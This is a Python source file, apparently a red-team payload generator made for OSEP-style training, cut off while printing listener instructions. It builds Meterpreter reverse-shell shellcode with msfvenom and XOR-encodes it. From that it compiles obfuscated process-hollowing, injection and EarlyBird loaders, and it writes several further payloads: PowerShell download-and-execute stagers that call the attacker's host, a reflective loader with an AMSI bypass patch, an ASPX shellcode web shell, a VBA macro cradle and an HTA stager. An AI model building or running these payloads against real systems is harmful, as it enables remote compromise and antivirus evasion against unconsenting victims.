#!/usr/bin/env python3
import argparse
import sys
import os
import shutil
import subprocess
import socket
import re
import base64
import random
import string
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

BANNER = r"""
[bold cyan]  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗  [/bold cyan][bold orange3] ██████╗ ███████╗███╗   ██╗[/bold orange3]
[bold cyan]  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗ [/bold cyan][bold orange3]██╔════╝ ██╔════╝████╗  ██║[/bold orange3]
[bold cyan]  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║ [/bold cyan][bold orange3]██║  ███╗█████╗  ██╔██╗ ██║[/bold orange3]
[bold cyan]  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║ [/bold cyan][bold orange3]██║   ██║██╔══╝  ██║╚██╗██║[/bold orange3]
[bold cyan]  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝ [/bold cyan][bold orange3]╚██████╔╝███████╗██║ ╚████║[/bold orange3]
[bold cyan]  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  [/bold cyan][bold orange3] ╚═════╝ ╚══════╝╚═╝  ╚═══╝[/bold orange3]
[bold blue]                               --- PROJECT GENESIS ---[/bold blue]
[bold black]                         Multi-Stage Payload Infrastructure Generator[/bold black]
"""


TEMPLATE_DIR = "/home/kali/tools/templates"
OUTPUT_BASE = "/home/kali/tools/payloads"

def random_string(length=8):
    return "".join(random.choices(string.ascii_letters, k=length))

def generate_hollowing_exe(target_dir, shellcode, key, lhost, lport, filename="hollowing.exe"):
    template_path = os.path.join(TEMPLATE_DIR, "hollowing.cs")
    if not os.path.exists(template_path):
        console.print(f"[bold red][-] Hollowing template not found at {template_path}[/bold red]")
        return None
    
    with open(template_path, "r") as f: content = f.read()
    
    # 1. Randomize Buffer Name
    buf_name = random_string(6)
    
    # 2. Format the XOR'ed shellcode array
    xor_sc = bytes([b ^ key for b in shellcode])
    sc_array = ", ".join([f"0x{b:02X}" for b in xor_sc])
    payload_cs = f"byte[] {buf_name} = new byte[{len(xor_sc)}] {{ {sc_array} }};"
    decryption_cs = f"for (int i = 0; i < {buf_name}.Length; i++) {{ {buf_name}[i] = (byte)((uint){buf_name}[i] ^ {hex(key)}); }}"
    
    # 3. Obfuscate strings (svchost.exe path)
    target_path = "c:\\windows\\system32\\svchost.exe"
    shift = random.randint(1, 10)
    shifted_path = "".join([chr(ord(c) + shift) for c in target_path])
    path_bytes = ", ".join([str(ord(c)) for c in shifted_path])
    v1, v2, v3 = random_string(5), random_string(5), random_string(5)
    decoder_func = f"new Func<string>(() => {{ byte[] {v1} = new byte[] {{ {path_bytes} }}; string {v2} = \"\"; foreach (byte {v3} in {v1}) {v2} += (char)({v3} - {shift}); return {v2}; }})()"

    # 4. Randomize Symbols
    symbols = {
        "#NS#": random_string(10),
        "#CLASS#": random_string(10),
        "#CREATE_SUSPENDED#": random_string(8),
        "#PBI#": random_string(8),
        "#PI#": random_string(8),
        "#SI#": random_string(8),
        "#PBI_STRUCT#": random_string(8),
        "#SHELLCODE#": payload_cs,
        "#DECRYPTION#": decryption_cs,
        "#STRING_DECODER#": decoder_func,
        "#BUF#": buf_name
    }
    
    for placeholder, replacement in symbols.items():
        content = content.replace(placeholder, replacement)
    
    # 5. Save the modified source
    src_path = os.path.join(target_dir, filename.replace(".exe", ".cs"))
    with open(src_path, "w") as f: f.write(content)
    
    # 5. Compile on Linux with mcs (x64)
    exe_path = os.path.join(target_dir, filename)
    console.print(f"[bold blue][*][/bold blue] Compiling Dynamic Loader ({filename})...")
    cmd = ["mcs", "-target:exe", f"-out:{exe_path}", "-platform:x64", "-unsafe", src_path]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode == 0:
            return filename
        else:
            console.print(f"[bold red][-] Compilation failed:[/bold red]\n{res.stderr}")
            return None
    except Exception as e:
        console.print(f"[bold red][-] Error during compilation: {e}[/bold red]")
        return None

def generate_injector_exe(target_dir, shellcode, key, lhost, lport, filename="injector.exe"):
    template_path = os.path.join(TEMPLATE_DIR, "injector.cs")
    if not os.path.exists(template_path):
        console.print(f"[bold red][-] Injector template not found at {template_path}[/bold red]")
        return None
    
    with open(template_path, "r") as f: content = f.read()
    
    buf_name = random_string(6)
    xor_sc = bytes([b ^ key for b in shellcode])
    sc_array = ", ".join([f"0x{b:02X}" for b in xor_sc])
    payload_cs = f"byte[] {buf_name} = new byte[{len(xor_sc)}] {{ {sc_array} }};"
    decryption_cs = f"for (int i = 0; i < {buf_name}.Length; i++) {{ {buf_name}[i] = (byte)((uint){buf_name}[i] ^ {hex(key)}); }}"
    
    target_proc = "explorer"
    shift = random.randint(1, 10)
    shifted_proc = "".join([chr(ord(c) + shift) for c in target_proc])
    proc_bytes = ", ".join([str(ord(c)) for c in shifted_proc])
    v1, v2, v3 = random_string(5), random_string(5), random_string(5)
    decoder_func = f"new Func<string>(() => {{ byte[] {v1} = new byte[] {{ {proc_bytes} }}; string {v2} = \"\"; foreach (byte {v3} in {v1}) {v2} += (char)({v3} - {shift}); return {v2}; }})()"

    symbols = {
        "#NS#": random_string(10),
        "#CLASS#": random_string(10),
        "#PROCESS_ALL_FLAGS#": random_string(8),
        "#GENERIC_ALL#": random_string(8),
        "#PAGE_READWRITE#": random_string(8),
        "#PAGE_READEXECUTE#": random_string(8),
        "#PAGE_READWRITEEXECUTE#": random_string(8),
        "#SEC_COMMIT#": random_string(8),
        "#SHELLCODE#": payload_cs,
        "#DECRYPTION#": decryption_cs,
        "#TARGET_PROC#": decoder_func,
        "#BUF#": buf_name
    }
    
    for placeholder, replacement in symbols.items():
        content = content.replace(placeholder, replacement)
    
    src_path = os.path.join(target_dir, filename.replace(".exe", ".cs"))
    with open(src_path, "w") as f: f.write(content)
    
    exe_path = os.path.join(target_dir, filename)
    console.print(f"[bold blue][*][/bold blue] Compiling Memory Migrator ({filename})...")
    cmd = ["mcs", "-target:exe", f"-out:{exe_path}", "-platform:x64", "-unsafe", src_path]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode == 0:
            return filename
        else:
            console.print(f"[bold red][-] Compilation failed:[/bold red]\n{res.stderr}")
            return None
    except Exception as e:
        console.print(f"[bold red][-] Error during compilation: {e}[/bold red]")
        return None

def generate_earlybird_exe(target_dir, shellcode, key, lhost, lport, filename="earlybird.exe"):
    template_path = os.path.join(TEMPLATE_DIR, "earlybird.cs")
    if not os.path.exists(template_path):
        console.print(f"[bold red][-] EarlyBird template not found at {template_path}[/bold red]")
        return None
    
    with open(template_path, "r") as f: content = f.read()
    
    buf_name = random_string(6)
    xor_sc = bytes([b ^ key for b in shellcode])
    sc_array = ", ".join([f"0x{b:02X}" for b in xor_sc])
    payload_cs = f"byte[] {buf_name} = new byte[{len(xor_sc)}] {{ {sc_array} }};"
    decryption_cs = f"for (int i = 0; i < {buf_name}.Length; i++) {{ {buf_name}[i] = (byte)((uint){buf_name}[i] ^ {hex(key)}); }}"
    
    target_proc = "c:\\\\windows\\\\system32\\\\notepad.exe"
    shift = random.randint(1, 10)
    shifted_proc = "".join([chr(ord(c) + shift) for c in target_proc])
    proc_bytes = ", ".join([str(ord(c)) for c in shifted_proc])
    v1, v2, v3 = random_string(5), random_string(5), random_string(5)
    decoder_func = f"new Func<string>(() => {{ byte[] {v1} = new byte[] {{ {proc_bytes} }}; string {v2} = \"\"; foreach (byte {v3} in {v1}) {v2} += (char)({v3} - {shift}); return {v2}; }})()"

    symbols = {
        "#NS#": random_string(10),
        "#CLASS#": random_string(10),
        "#SI#": random_string(8),
        "#PI#": random_string(8),
        "#SHELLCODE#": payload_cs,
        "#DECRYPTION#": decryption_cs,
        "#TARGET_PROC#": decoder_func,
        "#BUF#": buf_name
    }
    
    for placeholder, replacement in symbols.items():
        content = content.replace(placeholder, replacement)
    
    src_path = os.path.join(target_dir, filename.replace(".exe", ".cs"))
    with open(src_path, "w") as f: f.write(content)
    
    exe_path = os.path.join(target_dir, filename)
    console.print(f"[bold blue][*][/bold blue] Compiling EarlyBird Runner ({filename})...")
    cmd = ["mcs", "-target:exe", f"-out:{exe_path}", "-platform:x64", "-unsafe", src_path]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode == 0:
            return filename
        else:
            console.print(f"[bold red][-] Compilation failed:[/bold red]\n{res.stderr}")
            return None
    except Exception as e:
        console.print(f"[bold red][-] Error during compilation: {e}[/bold red]")
        return None

def generate_hollybird_exe(target_dir, shellcode, key, lhost, lport, filename="hollybird.exe"):
    template_path = os.path.join(TEMPLATE_DIR, "hollybird.cs")
    if not os.path.exists(template_path):
        console.print(f"[bold red][-] HollyBird template not found at {template_path}[/bold red]")
        return None
    
    with open(template_path, "r") as f: content = f.read()
    
    buf_name = random_string(6)
    xor_sc = bytes([b ^ key for b in shellcode])
    sc_array = ", ".join([f"0x{b:02X}" for b in xor_sc])
    payload_cs = f"byte[] {buf_name} = new byte[{len(xor_sc)}] {{ {sc_array} }};"
    decryption_cs = f"for (int i = 0; i < {buf_name}.Length; i++) {{ {buf_name}[i] = (byte)((uint){buf_name}[i] ^ {hex(key)}); }}"
    
    target_proc = "c:\\\\windows\\\\system32\\\\notepad.exe"
    shift = random.randint(1, 10)
    shifted_proc = "".join([chr(ord(c) + shift) for c in target_proc])
    proc_bytes = ", ".join([str(ord(c)) for c in shifted_proc])
    v1, v2, v3 = random_string(5), random_string(5), random_string(5)
    decoder_func = f"new Func<string>(() => {{ byte[] {v1} = new byte[] {{ {proc_bytes} }}; string {v2} = \"\"; foreach (byte {v3} in {v1}) {v2} += (char)({v3} - {shift}); return {v2}; }})()"

    symbols = {
        "#NS#": random_string(10),
        "#CLASS#": random_string(10),
        "#GENERIC_ALL#": random_string(8),
        "#PAGE_READWRITE#": random_string(8),
        "#PAGE_READEXECUTE#": random_string(8),
        "#PAGE_READWRITEEXECUTE#": random_string(8),
        "#SEC_COMMIT#": random_string(8),
        "#CREATE_SUSPENDED#": random_string(8),
        "#SI#": random_string(8),
        "#PI#": random_string(8),
        "#SHELLCODE#": payload_cs,
        "#DECRYPTION#": decryption_cs,
        "#TARGET_PROC#": decoder_func,
        "#BUF#": buf_name
    }
    
    for placeholder, replacement in symbols.items():
        content = content.replace(placeholder, replacement)
    
    src_path = os.path.join(target_dir, filename.replace(".exe", ".cs"))
    with open(src_path, "w") as f: f.write(content)
    
    exe_path = os.path.join(target_dir, filename)
    console.print(f"[bold blue][*][/bold blue] Compiling HollyBird (Phantom) Runner ({filename})...")
    cmd = ["mcs", "-target:exe", f"-out:{exe_path}", "-platform:x64", "-unsafe", src_path]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode == 0:
            return filename
        else:
            console.print(f"[bold red][-] Compilation failed:[/bold red]\n{res.stderr}")
            return None
    except Exception as e:
        console.print(f"[bold red][-] Error during compilation: {e}[/bold red]")
        return None

def get_ip(interface):
    try:
        socket.inet_aton(interface)
        return interface
    except socket.error:
        try:
            output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
            match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", output)
            if match: return match.group(1)
        except Exception: return None
    return None

def xor_data(data, key):
    return bytes([b ^ key for b in data])

def format_csharp(data):
    return f"byte[] buf = new byte[{len(data)}] {{ " + ", ".join([f"0x{b:02X}" for b in data]) + " };"

def format_ps_hex(data):
    return ",".join([f"0x{b:02X}" for b in data])

def format_vba_array(data):
    decimal_data = [str(b) for b in data]
    chunk_size = 50
    chunks = [decimal_data[i:i + chunk_size] for i in range(0, len(decimal_data), chunk_size)]
    return "buf = Array(" + ", _\n".join([", ".join(chunk) for chunk in chunks]) + ")"

def shift_string(s, shift=17):
    return "".join([f"{ord(c) + shift:03}" for c in s])

def generate_shellcode(payload, lhost, lport):
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f raw"
    console.print(f"[bold blue][*][/bold blue] Generating {payload} on port {lport}...")
    try:
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0: return None
        return stdout
    except Exception: return None

def get_advanced_ps_template(shellcode_hex, key):
    return f"""function LookupFunc {{
  Param ($moduleName, $functionName)
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }}).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {{If($_.Name -eq "GetProcAddress") {{$tmp+=$_}}}}
  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}}

function getDelegateType {{
  Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
  )
  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
  return $type.CreateType()
}}

# --- AMSI Bypass ---
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$patch = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

# --- Payload Execution ---
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $buf = {shellcode_hex}
$key = {key}
$buf = $buf | ForEach-Object {{ $_ -bxor $key }}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
"""

def main():
    console.print(BANNER)
    parser = argparse.ArgumentParser(description="PayloadGen - OSEP Payload Generator", add_help=False)
    parser.add_argument("--lhost", help="LHOST IP or Interface (e.g., tun0)")
    parser.add_argument("--key", type=int, help="XOR Key (default: random)")
    parser.add_argument("--sli-port-x64", type=int, default=4443, help="Sliver x64 Port (default: 4443)")
    parser.add_argument("--sli-port-x86", type=int, default=5553, help="Sliver x86 Port (default: 5553)")
    parser.add_argument("--met-port-x64", type=int, default=2223, help="Metasploit x64 Port (default: 2223)")
    parser.add_argument("--met-port-x86", type=int, default=1113, help="Metasploit x86 Port (default: 1113)")
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    try:
        args = parser.parse_args()
    except SystemExit: sys.exit(1)

    if args.help or not args.lhost:
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column("Option", style="bold yellow", width=35)
        table.add_column("Description", style="white")
        table.add_row("\n[bold cyan]Payload Configuration[/bold cyan]", "")
        table.add_row("--lhost [green]LHOST[/green]", "IP address or interface (tun0, eth0)")
        table.add_row("--key [green]INT[/green]", "XOR encryption key (default: random)")
        table.add_row("--sli-port-x64 [green]PORT[/green]", "Sliver x64 Port (default: 4443)")
        table.add_row("--sli-port-x86 [green]PORT[/green]", "Sliver x86 Port (default: 5553)")
        table.add_row("--met-port-x64 [green]PORT[/green]", "Metasploit x64 Port (default: 2223)")
        table.add_row("--met-port-x86 [green]PORT[/green]", "Metasploit x86 Port (default: 1113)")
        table.add_row("\n[bold cyan]General[/bold cyan]", "")
        table.add_row("-h, --help", "Show help")
        console.print(table); sys.exit(0)

    lhost = get_ip(args.lhost)
    if not lhost: console.print(f"[bold red][-] Error resolving IP for: {args.lhost}[/bold red]"); sys.exit(1)

    key = args.key if args.key is not None else random.randint(1, 255)
    console.print(f"[bold blue][*][/bold blue] Using XOR Key: [bold cyan]{hex(key)}[/bold cyan]")

    folder_name = lhost.replace(".", "-")
    target_dir = os.path.join(OUTPUT_BASE, folder_name)
    if not os.path.exists(target_dir): os.makedirs(target_dir)

    payloads_info = []

    # Metasploit x64 Generation
    met_x64_raw = generate_shellcode("windows/x64/meterpreter/reverse_tcp", lhost, args.met_port_x64)
    if met_x64_raw:
        with open(os.path.join(target_dir, "met.x64.bin"), "wb") as f: f.write(met_x64_raw)
        payloads_info.append({"name": "met.x64.bin", "port": args.met_port_x64, "type": "Raw Shellcode", "arch": "x64", "cmd": "N/A"})
        
        # Dynamic Loader EXE
        hollowing_exe = generate_hollowing_exe(target_dir, met_x64_raw, key, lhost, args.met_port_x64)
        if hollowing_exe:
            payloads_info.append({"name": hollowing_exe, "port": args.met_port_x64, "type": "Dynamic Loader (Hollowing)", "arch": "x64", "cmd": f".\\{hollowing_exe}"})
            
            # stage_hollowing.ps1 Generation
            stage_h_content = f"iwr http://{lhost}/{hollowing_exe} -O C:/Windows/Tasks/{hollowing_exe}\nC:/Windows/Tasks/{hollowing_exe}"
            with open(os.path.join(target_dir, "stage_hollowing.ps1"), "w") as f: f.write(stage_h_content)
            payloads_info.append({"name": "stage_hollowing.ps1", "port": "80", "type": "PS Stager (Hollowing)", "arch": "N/A", "cmd": f"powershell iex(iwr -useb http://{lhost}/stage_hollowing.ps1)"})

        # Memory Migrator EXE
        injector_exe = generate_injector_exe(target_dir, met_x64_raw, key, lhost, args.met_port_x64)
        if injector_exe:
            payloads_info.append({"name": injector_exe, "port": args.met_port_x64, "type": "Memory Migrator (Sections)", "arch": "x64", "cmd": f".\\{injector_exe}"})
            
            # stage_injector.ps1 Generation
            stage_i_content = f"iwr http://{lhost}/{injector_exe} -O C:/Windows/Tasks/{injector_exe}\nC:/Windows/Tasks/{injector_exe}"
            with open(os.path.join(target_dir, "stage_injector.ps1"), "w") as f: f.write(stage_i_content)
            payloads_info.append({"name": "stage_injector.ps1", "port": "80", "type": "PS Stager (Injector)", "arch": "N/A", "cmd": f"powershell iex(iwr -useb http://{lhost}/stage_injector.ps1)"})

        # EarlyBird Runner EXE
        earlybird_exe = generate_earlybird_exe(target_dir, met_x64_raw, key, lhost, args.met_port_x64)
        if earlybird_exe:
            payloads_info.append({"name": earlybird_exe, "port": args.met_port_x64, "type": "EarlyBird Runner (APC)", "arch": "x64", "cmd": f".\\{earlybird_exe}"})
            
            # stage_earlybird.ps1 Generation
            stage_eb_content = f"iwr http://{lhost}/{earlybird_exe} -O C:/Windows/Tasks/{earlybird_exe}\nC:/Windows/Tasks/{earlybird_exe}"
            with open(os.path.join(target_dir, "stage_earlybird.ps1"), "w") as f: f.write(stage_eb_content)
            payloads_info.append({"name": "stage_earlybird.ps1", "port": "80", "type": "PS Stager (EarlyBird)", "arch": "N/A", "cmd": f"powershell iex(iwr -useb http://{lhost}/stage_earlybird.ps1)"})

        # HollyBird Phantom EXE
        hollybird_exe = generate_hollybird_exe(target_dir, met_x64_raw, key, lhost, args.met_port_x64)
        if hollybird_exe:
            payloads_info.append({"name": hollybird_exe, "port": args.met_port_x64, "type": "HollyBird Phantom (Sections+APC)", "arch": "x64", "cmd": f".\\{hollybird_exe}"})
            
            # stage_hollybird.ps1 Generation
            stage_hb_content = f"iwr http://{lhost}/{hollybird_exe} -O C:/Windows/Tasks/{hollybird_exe}\nC:/Windows/Tasks/{hollybird_exe}"
            with open(os.path.join(target_dir, "stage_hollybird.ps1"), "w") as f: f.write(stage_hb_content)
            payloads_info.append({"name": "stage_hollybird.ps1", "port": "80", "type": "PS Stager (HollyBird)", "arch": "N/A", "cmd": f"powershell iex(iwr -useb http://{lhost}/stage_hollybird.ps1)"})

        met_x64_xor = xor_data(met_x64_raw, key)
        with open(os.path.join(target_dir, "met_xor.x64.bin"), "wb") as f: f.write(met_x64_xor)
        payloads_info.append({"name": "met_xor.x64.bin", "port": args.met_port_x64, "type": f"XOR Shellcode ({hex(key)})", "arch": "x64", "cmd": "N/A"})

        # Metasploit Advanced Loader (.txt)
        met_adv_ps = get_advanced_ps_template(format_ps_hex(met_x64_xor), key)
        with open(os.path.join(target_dir, "met_advanced_loader.txt"), "w") as f: f.write(met_adv_ps)
        payloads_info.append({"name": "met_advanced_loader.txt", "port": "80", "type": "Reflective Loader (AMSI Bypass)", "arch": "x64", "cmd": f"powershell iex(iwr -useb http://{lhost}/met_advanced_loader.txt)"})

    # Metasploit x86 Generation
    met_x86_raw = generate_shellcode("windows/meterpreter/reverse_tcp", lhost, args.met_port_x86)
    if met_x86_raw:
        with open(os.path.join(target_dir, "met.x86.bin"), "wb") as f: f.write(met_x86_raw)
        payloads_info.append({"name": "met.x86.bin", "port": args.met_port_x86, "type": "Raw Shellcode", "arch": "x86", "cmd": "N/A"})
        
        met_x86_xor = xor_data(met_x86_raw, key)
        with open(os.path.join(target_dir, "met_xor.x86.bin"), "wb") as f: f.write(met_x86_xor)
        payloads_info.append({"name": "met_xor.x86.bin", "port": args.met_port_x86, "type": f"XOR Shellcode ({hex(key)})", "arch": "x86", "cmd": "N/A"})

    # Sliver x64 Generation
    x64_raw = generate_shellcode("windows/x64/meterpreter/reverse_tcp", lhost, args.sli_port_x64)
    if x64_raw:
        with open(os.path.join(target_dir, "sliver.x64.bin"), "wb") as f: f.write(x64_raw)
        payloads_info.append({"name": "sliver.x64.bin", "port": args.sli_port_x64, "type": "Sliver Shellcode", "arch": "x64", "cmd": "N/A"})
        
        x64_xor = xor_data(x64_raw, key)
        with open(os.path.join(target_dir, "sliver_xor.x64.bin"), "wb") as f: f.write(x64_xor)
        payloads_info.append({"name": "sliver_xor.x64.bin", "port": args.sli_port_x64, "type": f"Sliver XOR ({hex(key)})", "arch": "x64", "cmd": "N/A"})
        
        # Advanced Loader (.txt)
        adv_ps = get_advanced_ps_template(format_ps_hex(x64_xor), key)
        with open(os.path.join(target_dir, "advanced_loader.txt"), "w") as f: f.write(adv_ps)
        payloads_info.append({"name": "advanced_loader.txt", "port": "80", "type": "Reflective Loader (AMSI Bypass)", "arch": "x64", "cmd": f"powershell iex(iwr -useb http://{lhost}/advanced_loader.txt)"})

        # C# Template
        cs_template = os.path.join(TEMPLATE_DIR, "csharp_shell.cs")
        if os.path.exists(cs_template):
            with open(cs_template, "r") as f: content = f.read()
            content = re.sub(r"byte\[\] buf = new byte\[\d+\] \{ .* \};", format_csharp(x64_xor), content)
            content = re.sub(r"buf\[i\] \^ \d+;", f"buf[i] ^ {key};", content)
            with open(os.path.join(target_dir, "csharp_shell.cs"), "w") as f: f.write(content)
            payloads_info.append({"name": "csharp_shell.cs", "port": args.sli_port_x64, "type": "C# Source Runner", "arch": "x64", "cmd": "N/A"})

        # VBA x64
        vba64_template = os.path.join(TEMPLATE_DIR, "x64_vb_shell.vb")
        if os.path.exists(vba64_template):
            with open(vba64_template, "r") as f: content = f.read()
            ps_cmd = f"powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{lhost}/advanced_loader.txt'))"
            content = re.sub(r'Apples = ".*"', f'Apples = "{shift_string(ps_cmd)}"', content)
            with open(os.path.join(target_dir, "x64_vb_shell.vb"), "w") as f: f.write(content)
            payloads_info.append({"name": "x64_vb_shell.vb", "port": "N/A", "type": "VBA Macro (WMI De-chaining)", "arch": "x64", "cmd": "N/A"})

        # PowerShell Stager (Original)
        ps_content = f"$buf = {','.join([str(b) for b in x64_xor])}\nfor($i=0; $i -lt $buf.count; $i++) {{ $buf[$i] = $buf[$i] -bxor {key} }}\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, [System.IntPtr]0, $buf.Length)"
        with open(os.path.join(target_dir, "payload.ps1"), "w") as f: f.write(ps_content)
        payloads_info.append({"name": "payload.ps1", "port": args.sli_port_x64, "type": "XOR PS1 script", "arch": "x64", "cmd": f"powershell -c iex(iwr -useb http://{lhost}/payload.ps1)"})

        # ASPX
        aspx_buf = ",".join([f"0x{b:02X}" for b in x64_xor])
        aspx_content = f'<%@ Page Language="C#" AutoEventWireup="true" %><%@ Import Namespace="System.Runtime.InteropServices" %><script runat="server">[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);protected void Page_Load(object sender, EventArgs e) {{ byte[] vL8fwOy_ = new byte[] {{ {aspx_buf} }}; for (int i = 0; i < vL8fwOy_.Length; i++) {{ vL8fwOy_[i] = (byte)(vL8fwOy_[i] ^ {key}); }} IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)vL8fwOy_.Length, 0x3000, 0x40); Marshal.Copy(vL8fwOy_, 0, addr, vL8fwOy_.Length); CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); }}</script>'
        with open(os.path.join(target_dir, "shell.aspx"), "w") as f: f.write(aspx_content)
        payloads_info.append({"name": "shell.aspx", "port": args.sli_port_x64, "type": "XOR ASPX Shell", "arch": "x64", "cmd": "N/A"})

    # Sliver x86 Generation
    x86_raw = generate_shellcode("windows/meterpreter/reverse_tcp", lhost, args.sli_port_x86)
    if x86_raw:
        with open(os.path.join(target_dir, "sliver.x86.bin"), "wb") as f: f.write(x86_raw)
        payloads_info.append({"name": "sliver.x86.bin", "port": args.sli_port_x86, "type": "Sliver Shellcode", "arch": "x86", "cmd": "N/A"})
        
        x86_xor = xor_data(x86_raw, key)
        with open(os.path.join(target_dir, "sliver_xor.x86.bin"), "wb") as f: f.write(x86_xor)
        payloads_info.append({"name": "sliver_xor.x86.bin", "port": args.sli_port_x86, "type": f"Sliver XOR ({hex(key)})", "arch": "x86", "cmd": "N/A"})

    # MSHTA
    mshta_template = os.path.join(TEMPLATE_DIR, "shell.mshta")
    if os.path.exists(mshta_template):
        shutil.copy(mshta_template, os.path.join(target_dir, "shell.mshta"))
        payloads_info.append({"name": "shell.mshta", "port": "N/A", "type": "HTA Stager", "arch": "N/A", "cmd": f"mshta http://{lhost}/shell.mshta"})

    # Summary Display
    console.print(f"\n[bold green][+][/bold green] All payloads generated in: [cyan]{target_dir}[/cyan]")
    table = Table(title="Infrastructure Assets")
    table.add_column("Filename", style="cyan")
    table.add_column("Type", style="magenta")
    table.add_column("Arch", style="green")
    table.add_column("Port", style="yellow")
    table.add_column("Execution Command", style="white")
    
    for p in payloads_info: 
        table.add_row(p['name'], p['type'], p['arch'], str(p['port']), p['cmd'])
    console.print(table)

    # 1. Metasploit Commands
    msf_64 = f"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set EXITFUNC thread; set LHOST {lhost}; set LPORT {args.met_port_x64}; set ExitOnSession false; run -j -z"
    msf_86 = f"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set EXITFUNC thread; set LHOST {lhost}; set LPORT {args.met_port_x86}; set ExitOnSession false; run -j -z"
    
    # 2. Sliver Commands
    sli_x64 = [
        f"profiles new --http {lhost}:8088 --format shellcode osep",
        f"stage-listener --url tcp://{lhost}:{args.sli_port_x64} --profile osep",
        f"http -L {lhost} --lport 8088"
    ]
    sli_x86 = [
        f"profiles new --http {lhost}:9090 --format shellcode -a x86 osepx86",
        f"stage-listener --url tcp://{lhost}:{args.sli_port_x86} --profile osepx86",
        f"http -L {lhost} --lport 9090"
    ]

    console.print(f"\n[bold yellow]─── DEPLOYMENT & LISTENER GUIDE ───[/bold yellow]")
    console.print(f"[bold cyan]1. Metasploit Infrastructure[/bold cyan]")
    console.print(f"   [yellow]x64 Assets:[/yellow] [white]hollowing.exe, injector.exe, earlybird.exe, hollybird.exe, stage_*.ps1, met_advanced_loader.txt, shell.aspx[/white]")
    console.print(f"   [yellow]x64 Listener:[/yellow] [bold white]sudo msfconsole -q -x \"{msf_64}\"[/bold white]\n")
    console.print(f"   [yellow]x86 Assets:[/yellow] [white]met_xor.x86.bin[/white]")
    console.print(f"   [yellow]x86 Listener:[/yellow] [bold white]sudo msfconsole -q -x \"{msf_86}\"[/bold white]")
    
    console.print(f"\n[bold cyan]2. Sliver Infrastructure[/bold cyan]")
    console.print(f"   [yellow]x64 Assets:[/yellow] [white]sliver_xor.x64.bin, advanced_loader.txt, payload.ps1[/white]")
    console.print(f"   [yellow]x64 Setup:[/yellow]")
